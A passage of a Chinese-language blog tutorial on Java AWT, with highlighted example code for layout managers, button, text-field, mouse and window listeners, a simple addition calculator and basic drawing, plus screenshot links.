1层左右组件</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">east1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;east1&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">west1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;west1&quot;</span>);</span><br><span class="line">        panel1.add(east1,BorderLayout.EAST);</span><br><span class="line">        panel1.add(west1,BorderLayout.WEST);</span><br><span class="line">        panel1.add(panel2);</span><br><span class="line">		<span class="comment">// 2层左右组件</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">east2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;east2&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">west2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;west2&quot;</span>);</span><br><span class="line">        panel3.add(east2,BorderLayout.EAST);</span><br><span class="line">        panel3.add(west2,BorderLayout.WEST);</span><br><span class="line">        panel3.add(panel4);</span><br><span class="line">		<span class="comment">// 1层中间组件</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">button5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button5&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button6&quot;</span>);</span><br><span class="line">        panel2.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">1</span>));</span><br><span class="line">        panel2.add(button5);</span><br><span class="line">        panel2.add(button6);</span><br><span class="line">		<span class="comment">// 2层中间组件</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">button7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button7&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button8</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button8&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button9</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button9&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button10</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button10&quot;</span>);</span><br><span class="line">        panel4.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">2</span>));</span><br><span class="line">        panel4.add(button7);</span><br><span class="line">        panel4.add(button8);</span><br><span class="line">        panel4.add(button9);</span><br><span class="line">        panel4.add(button10);</span><br><span class="line">		</span><br><span class="line">        frame.add(panel1);</span><br><span class="line">        frame.add(panel3);</span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">        frame.setSize(<span class="number">400</span>,<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220904132118737.png" alt="image-20220904132118737"></p>
<h4 id="网格包布局">1.3.3.5. 网格包布局</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI.AWTDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo10</span> <span class="keyword">extends</span> <span class="title class_">Frame</span> &#123;</span><br><span class="line">    GridBagConstraints Constraints;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Demo10</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Demo10</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;GridBagLayout&quot;</span>);</span><br><span class="line">        <span class="type">GridBagLayout</span> <span class="variable">Layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GridBagLayout</span>(); <span class="comment">// 创建布局</span></span><br><span class="line">        Constraints = <span class="keyword">new</span> <span class="title class_">GridBagConstraints</span>(); <span class="comment">// 创建约束对象</span></span><br><span class="line">        setLayout(Layout);  <span class="comment">// 设置布局管理器</span></span><br><span class="line">        Constraints.fill = GridBagConstraints.BOTH; <span class="comment">// 设置组件各方向都可以拉伸的效果</span></span><br><span class="line">        Constraints.weightx = <span class="number">1</span>; <span class="comment">// 设置横向的权重为1</span></span><br><span class="line">        Constraints.weighty = <span class="number">1</span>; <span class="comment">// 设置纵向的权重为1</span></span><br><span class="line">        <span class="comment">// 增加组件</span></span><br><span class="line">        addComponent(<span class="string">&quot;btn1&quot;</span>,Layout,Constraints);</span><br><span class="line">        addComponent(<span class="string">&quot;btn2&quot;</span>,Layout,Constraints);</span><br><span class="line">        addComponent(<span class="string">&quot;btn3&quot;</span>,Layout,Constraints);</span><br><span class="line">        Constraints.gridwidth = GridBagConstraints.REMAINDER; <span class="comment">// 添加的组件是本行的最后一个</span></span><br><span class="line">        addComponent(<span class="string">&quot;btn4&quot;</span>,Layout,Constraints);</span><br><span class="line">        <span class="comment">// 换行重新设置权重</span></span><br><span class="line">        Constraints.weightx = <span class="number">0</span>; <span class="comment">// 设置横向的权重为0</span></span><br><span class="line">        Constraints.weighty = <span class="number">0</span>; <span class="comment">// 设置纵向的权重为0</span></span><br><span class="line">        addComponent(<span class="string">&quot;btn5&quot;</span>,Layout,Constraints);</span><br><span class="line">        Constraints.gridwidth = <span class="number">2</span>; <span class="comment">//设置组件跨2个网格（默认是1）</span></span><br><span class="line">        addComponent(<span class="string">&quot;btn6&quot;</span>,Layout,Constraints);</span><br><span class="line">        Constraints.gridwidth = GridBagConstraints.REMAINDER;</span><br><span class="line">        addComponent(<span class="string">&quot;btn7&quot;</span>,Layout,Constraints);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span> &#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加组件的方法，通过指定的约束，将组件添加的布局管理器中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addComponent</span><span class="params">(String name, GridBagLayout layout,GridBagConstraints c)</span>&#123;</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(name); <span class="comment">// 创建按钮</span></span><br><span class="line">        layout.setConstraints(button, c); <span class="comment">// 设置约束对象和按钮绑定</span></span><br><span class="line">        add(button);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221113194235719.png" alt="image-20221113194235719"></p>
<h3 id="2-4、事件监听">1.3.4. 2.4、事件监听</h3><h4 id="按钮点击">1.3.4.1. 按钮点击</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Frame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Frame</span>();</span><br><span class="line">        frame.setSize(<span class="number">200</span>,<span class="number">200</span>);</span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;button&quot;</span>);</span><br><span class="line">        frame.add(button);</span><br><span class="line">        <span class="comment">// 创建监听器，需要一个监听方法,监听方法的对象传入</span></span><br><span class="line">        button.addActionListener(<span class="keyword">new</span> <span class="title class_">MyActionListener</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现ActionListener接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyActionListener</span> <span class="keyword">implements</span> <span class="title class_">ActionListener</span>&#123;</span><br><span class="line">    <span class="comment">// 重写actionPerformed方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is test actionlistener&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111211400225.png" alt="image-20221111211400225"></p>
<h4 id="多个按钮实现一个监听">1.3.4.2. 多个按钮实现一个监听</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo09</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 两个按钮，实现一个监听</span></span><br><span class="line">        <span class="comment">// 开始 停止</span></span><br><span class="line">        <span class="type">Frame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Frame</span>(<span class="string">&quot;开始-停止&quot;</span>);</span><br><span class="line">        frame.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">2</span>,<span class="number">1</span>));</span><br><span class="line">        <span class="type">Button</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;stop&quot;</span>);</span><br><span class="line">        b1.setActionCommand(<span class="string">&quot;start-button&quot;</span>);</span><br><span class="line">        b2.setActionCommand(<span class="string">&quot;stop-button&quot;</span>);</span><br><span class="line">        b1.addActionListener(<span class="keyword">new</span> <span class="title class_">MyActionListener3</span>());</span><br><span class="line">        b2.addActionListener(<span class="keyword">new</span> <span class="title class_">MyActionListener3</span>());</span><br><span class="line">        frame.add(b1);</span><br><span class="line">        frame.add(b2);</span><br><span class="line">        frame.pack();</span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyActionListener3</span> <span class="keyword">implements</span> <span class="title class_">ActionListener</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">        <span class="comment">// e.getActionCommand()获取setActionCommand的值</span></span><br><span class="line">        <span class="keyword">if</span> (e.getActionCommand().equals(<span class="string">&quot;start-button&quot;</span>))</span><br><span class="line">            System.out.println(<span class="string">&quot;开始按钮被点击了&quot;</span>+e.getActionCommand());</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (e.getActionCommand().equals(<span class="string">&quot;stop-button&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;结束按钮被点击了&quot;</span>+e.getActionCommand());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221111213220560.png" alt="image-20221111213220560"></p>
<h4 id="获取文本框的内容">1.3.4.3. 获取文本框的内容</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo08</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MyTextFiled</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTextFiled</span> <span class="keyword">extends</span> <span class="title class_">Frame</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyTextFiled</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 单行文本框</span></span><br><span class="line">        <span class="type">TextField</span> <span class="variable">textField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>();</span><br><span class="line">        add(textField);</span><br><span class="line">        <span class="comment">// 按下回车获得输入框的事件</span></span><br><span class="line">        textField.addActionListener(<span class="keyword">new</span> <span class="title class_">MyActionListener2</span>());</span><br><span class="line">        <span class="comment">// 设置替换编码为*</span></span><br><span class="line">        textField.setEchoChar(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        pack();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现ActionListener接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyActionListener2</span> <span class="keyword">implements</span> <span class="title class_">ActionListener</span> &#123;</span><br><span class="line">    <span class="comment">// 重写actionPerformed方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">        <span class="comment">// e.getSource是Object类，需要子类强转</span></span><br><span class="line">        <span class="type">TextField</span> <span class="variable">filed</span> <span class="operator">=</span> (TextField) e.getSource();</span><br><span class="line">        <span class="comment">// getText()获取文本框的内容</span></span><br><span class="line">        System.out.println(filed.getText());</span><br><span class="line">        <span class="comment">// 将文本框内容设置为空</span></span><br><span class="line">        filed.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221112101157630.png" alt="image-20221112101157630"></p>
<h3 id="2-5、简易计算器">1.3.5. 2.5、简易计算器</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.deploy.xml.XMLable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowEvent;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 制作一个计算器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MyFrame</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算机类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyFrame</span> <span class="keyword">extends</span> <span class="title class_">Frame</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyFrame</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;MyCalc&quot;</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">300</span>,<span class="number">100</span>);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 3个文本框,columns表示文本框最多能输入几个字符，可以增加长度</span></span><br><span class="line">        <span class="type">TextField</span> <span class="variable">num1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="type">TextField</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="type">TextField</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextField</span>(<span class="number">20</span>);</span><br><span class="line">        <span class="comment">// 1个标签</span></span><br><span class="line">        <span class="type">Label</span> <span class="variable">operator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Label</span>(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">        <span class="comment">// 1个按钮</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">equ</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Button</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">        <span class="comment">// 布局：采用流式布局</span></span><br><span class="line">        setLayout(<span class="keyword">new</span> <span class="title class_">FlowLayout</span>());</span><br><span class="line">        add(num1);</span><br><span class="line">        add(operator);</span><br><span class="line">        add(num2);</span><br><span class="line">        add(equ);</span><br><span class="line">        add(result);</span><br><span class="line">        pack();</span><br><span class="line">        <span class="comment">// 绑定事件</span></span><br><span class="line">        equ.addActionListener(<span class="keyword">new</span> <span class="title class_">CalcActionListener</span>(num1,num2,result));</span><br><span class="line">        <span class="comment">// 控制退出</span></span><br><span class="line">        addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span> &#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CalcActionListener</span> <span class="keyword">implements</span> <span class="title class_">ActionListener</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> TextField num1;</span><br><span class="line">    <span class="keyword">private</span> TextField num2;</span><br><span class="line">    <span class="keyword">private</span> TextField result;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CalcActionListener</span><span class="params">(TextField num1,TextField num2,TextField result)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.num1 = num1;</span><br><span class="line">        <span class="built_in">this</span>.num2 = num2;</span><br><span class="line">        <span class="built_in">this</span>.result = result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">        <span class="comment">// Double.parseDouble将String类型转换为Double</span></span><br><span class="line">        <span class="type">Double</span> <span class="variable">n1</span> <span class="operator">=</span> Double.parseDouble(num1.getText());</span><br><span class="line">        <span class="type">Double</span> <span class="variable">n2</span> <span class="operator">=</span> Double.parseDouble(num2.getText());</span><br><span class="line">        <span class="comment">// 将n1+n2的结果转换为String</span></span><br><span class="line">        result.setText(<span class="string">&quot;&quot;</span>+(n1+n2));</span><br><span class="line">        num1.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        num2.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221112140928555.png" alt="image-20221112140928555"></p>
<h3 id="2-6、画笔">1.3.6. 2.6、画笔</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MyPoint</span>().LoadFrame();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPoint</span> <span class="keyword">extends</span> <span class="title class_">Frame</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyPoint</span><span class="params">()</span>&#123;</span><br><span class="line">        CloseFrame();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">LoadFrame</span><span class="params">()</span>&#123;</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">500</span>,<span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 画笔</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">paint</span><span class="params">(Graphics g)</span> &#123;</span><br><span class="line">        <span class="comment">// 画笔，需要有颜色，画笔可以画画</span></span><br><span class="line">        g.setColor(Color.red);</span><br><span class="line">        <span class="comment">// 画一个Oval圆,Rect矩形</span></span><br><span class="line">        g.drawOval(<span class="number">100</span>,<span class="number">100</span>,<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">        g.fillOval(<span class="number">200</span>,<span class="number">200</span>,<span class="number">100</span>,<span class="number">100</span>); <span class="comment">// 实心的圆</span></span><br><span class="line">        <span class="comment">// 养成习惯，画笔用完，将其还原到最初的颜色，黑色</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">CloseFrame</span><span class="params">()</span>&#123;</span><br><span class="line">        addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span> &#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221112145502194.png" alt="image-20221112145502194"></p>
<h3 id="2-7、鼠标监听">1.3.7. 2.7、鼠标监听</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MyPoint</span>(<span class="string">&quot;drawing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPoint</span> <span class="keyword">extends</span> <span class="title class_">Frame</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> ArrayList points;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyPoint</span><span class="params">(String title)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(title);</span><br><span class="line">        setVisible(<span class="literal">true</span>);</span><br><span class="line">        setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">500</span>,<span class="number">500</span>);</span><br><span class="line">        <span class="comment">//存鼠标的点</span></span><br><span class="line">        points=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 鼠标监听器</span></span><br><span class="line">        <span class="built_in">this</span>.addMouseListener(<span class="keyword">new</span> <span class="title class_">MyMouserListener</span>());</span><br><span class="line"></span><br><span class="line">        addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span> &#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 画笔</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">paint</span><span class="params">(Graphics g)</span> &#123;</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> points.iterator();</span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">Point</span> <span class="variable">point</span> <span class="operator">=</span> (Point) iterator.next();</span><br><span class="line">            g.setColor(Color.CYAN);</span><br><span class="line">            g.fillOval(point.x, point.y, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyMouserListener</span> <span class="keyword">extends</span> <span class="title class_">MouseAdapter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mousePressed</span><span class="params">(MouseEvent e)</span> &#123;</span><br><span class="line">            <span class="type">MyPoint</span> <span class="variable">frame</span> <span class="operator">=</span> (MyPoint) e.getSource();</span><br><span class="line">            Point p1=<span class="keyword">new</span> <span class="title class_">Point</span>(e.getX(),e.getY());</span><br><span class="line">            points.add(p1);</span><br><span class="line">            frame.repaint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-8、窗口监听">1.3.8. 2.8、窗口监听</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src.GUI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.WindowEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">WindowsFrame</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WindowsFrame</span> <span class="keyword">extends</span> <span class="title class_">Frame</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WindowsFrame</span><span 